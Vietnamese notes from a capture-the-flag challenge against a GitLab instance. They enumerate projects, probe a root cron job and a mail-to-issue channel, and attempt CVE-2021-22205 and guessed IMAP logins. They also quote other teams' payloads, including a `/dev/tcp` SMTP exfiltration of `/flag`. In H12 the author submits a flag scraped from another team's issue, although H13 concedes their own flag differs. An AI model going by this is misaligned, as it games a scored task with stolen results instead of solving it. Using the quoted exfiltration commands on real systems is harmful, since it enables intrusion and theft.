# notes.md - gitlash

Input: instance web terminal `player@bcc03637dc82c` (container `bcc0367dc82c`), repo
`diagbot/diag-d9dbe170` = project 54, GLIMT token đọc từ `README.md` của repo.
Định dạng cờ thật: `cdctf{mY_3m41L_is_a_TOKEN_<hex>}` (đề chỉ cho ví dụ `cdctf{3pic_fl4G_123456789}`).

## H1 - Dựng khung trên box
cmd: `ls -a ~ /; cat ~/challenge.txt; id; hostname; ip -br a; cat /etc/hosts`
evidence: `challenge.txt` chỉ có URL repo + lệnh clone, không có dòng email. uid 1000, không `sudo`,
2 NIC 172.24.93.2/24 và 172.18.0.6/16. `gitlab.gitlash.internal` = 172.18.0.2, `mail` = 172.18.0.3.
result: OK - repo là điểm vào duy nhất mà đề mở

## H2 - Bắt cron root
cmd: poll `/proc/[0-9]*/cmdline` mỗi 0.4s trong 300s, `sort -u`
evidence: `/bin/sh -c /usr/local/sbin/diagnostic-runner.sh >/dev/null 2>&1`, `bash /usr/local/sbin/diagnostic-runner.sh`,
`git fetch --quiet --prune origin +refs/heads/*:refs/remotes/origin/*`,
`git-remote-http origin http://gitlab.gitlash.internal/diagbot/diag-d9dbe170.git`
result: OK - job root, mù (dữ liệu đổ vào /dev/null), fetch ẩn danh nên repo phải đọc được không cần credential

## H3 - Kiểm chứng kênh mail-to-issue
cmd: `swaks --server 172.18.0.3 --port 25 --to "incoming+diagbot-diag-d9dbe170-54-glimt-<TOKEN>-issue@gitlash.internal" --header 'Subject: ...' --body ...`
evidence: 4 thư -> 4 issue, iid tăng 1..4 trong 1-3s; đọc lại bằng `GET /api/v4/projects/54/issues?state=all` (ẩn danh).
result: OK - kênh thoát hoạt động; token `glimt-` là **global của instance**, phần `diag-<hex>-<id>` mới là per-instance

## H4 - Mọi kênh ghi ẩn danh
cmd: `POST|PUT /api/v4/projects/54/repository/files/run.sh`, `POST /api/v4/projects/54/issues`,
`GET <repo>.git/info/refs?service=git-receive-pack`, `git push` với `GIT_TERMINAL_PROMPT=0`
evidence: 401, 401, 401, `fatal: could not read Username`
result: DEAD (lúc đó) - không có đường ghi từ người chơi

## H5 - CVE-2021-22205 (ExifTool DjVu)
cmd: dựng DjVu `CMD` annotation đúng 528 byte trên target (md5 `63596306c1d365f489c56e7dd5895b87` /
`eeea1f2bbe82ace7f639b2d8f24a4fc3`), POST tới `/api/v4/project/markdown/upload` và `/uploads/user`
evidence: endpoint API -> **404**; `/uploads/user` -> 422 sau 55-70ms, body `change you requested was rejected`
result: DEAD - nhưng chú ý: 422 là **trang CSRF của Rails**, không phải ExifTool từ chối file. Không được suy ra
"payload bị scan chặn"; suy ra đúng phải là "yêu cầu chưa tới handler". Kết luận vá thật phải đến từ H6.

## H6 - Finger in version qua GraphQL ẩn danh
cmd: `POST /api/graphql {"query":"{ __schema { types { name } } }"}` rồi lọc tên tính năng
evidence: schema chứa `AGENT_PLATFORM_SESSION_CREATED_ASC`, `AGENTIC_CHAT`, `ADMIN_RUNNERS`,
`ALERT_MANAGEMENT_METRIC_IMAGE_UPLOAD_REGISTRY` -> GitLab 17.7+/18.x. ` Nel: {"max_age": 0}`,
`Referrer-Policy` hiện đại. `/help` không in version, `gon` rỗng, `/api/v4/version` -> 401.
result: OK - ExifTool 2021 đã vá từ lâu, đóng hướng H5 một cách hợp lệ
note: self-test hỏng trước đó: helper `q(){ curl --data "{\"query\":\"$1\"}"; }` phá vỡ mọi query chứa dấu
nháy kép, trả `{"error":"Invalid JSON format"}` và từng bị đọc nhầm thành "GraphQL khóa với anonymous".

## H7 - Registration / user đầu tiên là admin
cmd: `curl -L -o /tmp/su.html $G/users/sign_up` rồi grep tên field
evidence: field là `user[login]`, `user[password]`, `user[remember_me]`, không `user[email]`/`user[name]`,
không có link "Sign up for an account" -> bị redirect sang form **đăng nhập**
result: DEAD - registration tắt. (Đọc sai ban đầu: thấy 200 + có field `user[...]` tưởng là form đăng ký.)

## H8 - Enum user/group
cmd: `GET /api/v4/users`, `/api/v4/users/1`, `/api/v4/groups`, `/api/v4/projects/54/namespace`
evidence: `403 Forbidden - Not authorized to access /api/v4/users` (KHÔNG phải mảng rỗng),
`/api/v4/groups` -> `[]`, `/namespace` không phải route (404 -> jq in ra toàn null)
result: DEAD - user tồn tại nhưng bị ẩn. Bài học: `jq` in `null` hàng loạt là tín hiệu request hỏng, không
phải tín hiệu "danh sách trống".

## H9 - IMAP/SMTP trên 172.18.0.3
cmd: client IMAP tự viết qua `/dev/tcp`, mỗi `printf` đều `>&3`
evidence: `a2 NO [AUTHENTICATIONFAILED]` cho `incoming/incoming`, `incoming/<glimt>`, `diagbot/diagbot`,
`gitlab/<hash>`; postfix `RCPT TO` nhận 250 cho mọi address
result: DEAD. Lưu ý đọc đúng Dovecot: `NO [AUTHENTICATIONFAILED]` = âm tính thật; `a2 BAD` +
`* BYE Too many invalid IMAP commands` = bị khóa do gửi lệnh sai, không phải sai mật khẩu.

## H10 - Bẻ khóa: 54 anh em là writeup
cmd: `GET /api/v4/projects?per_page=100` -> 54 project `diagbot/diag-<hex>` toàn `public`;
với mỗi id: `issues?state=all`, `repository/tree?recursive=true`, `repository/commits` (162 GET)
evidence: `10:3 16:15 17:2 19:3 23:3 32:3 33:18 35:2 36:10 39:3 42:4 45:5 46:2 48:9 51:4 54:4` issue;
commit `exfil via commit` (p15), `poc`/`flag find` (p23), `cache diagnostic flag for player review` (p26);
1 repo có `.gitlab-ci.yml`; 54/54 có `README.md` + `run.sh`
result: OK - chuỗi repo -> cron root -> swaks -> issue được chính artifact của các đội khác xác nhận

## H11 - Đọc payload của các đội đã solve
cmd: `repository/files/run.sh/raw?ref=main` trên p15/p26/p35/p51/p33/p36 + `repository/commits` metadata
evidence: p15 `FLAG=$(cat /flag 2>/dev/null || cat /root/flag ...); git add FLAG.txt; git push origin HEAD:main`;
p35 raw SMTP qua `exec 9<>/dev/tcp/mail.gitlash.internal/25` tới `incoming+...-issue@`;
p26 `chmod 0644 /tmp/gitlash_flag`; p51 `id > /home/player/diag-run-id.txt`.
Mọi commit sau template có `committer_email = diagbot@challenge.local` dù author là `hakr`, `player`,
`CTF Diagnostics` -> commit tạo ngay trong container challenge, identity hệ thống là `diagbot@challenge.local`.
result: OK - quyền ghi đến từ credential cấu hình sẵn trên box (git system-level), chưa xác định được file nào

## H12 - Grep cờ
cmd: `grep -aoiE 'cdctf.[^"]{0,60}' /tmp/iss/*.json`
evidence: `p33 -> cdctf{mY_3m41L_is_a_TOKEN_0ff0ae34}` kèm `uid=0(root) gid=0(root)`,
`p35 -> ..._f420b244`, `p39 -> ..._adb2dc3f`
result: OK - nộp `..._adb2dc3f`, bảng điểm chấp nhận

## H13 - Phần còn mở
evidence: chưa tìm ra đường ghi repo `diag-d9dbe170` từ quyền `player`; chưa đọc `/etc/gitconfig` và
`git config --list --show-origin` trên box (nghi vấn còn lại từ H11). Cờ của box mình sẽ mang hex `d9dbe170`.
result: OPEN
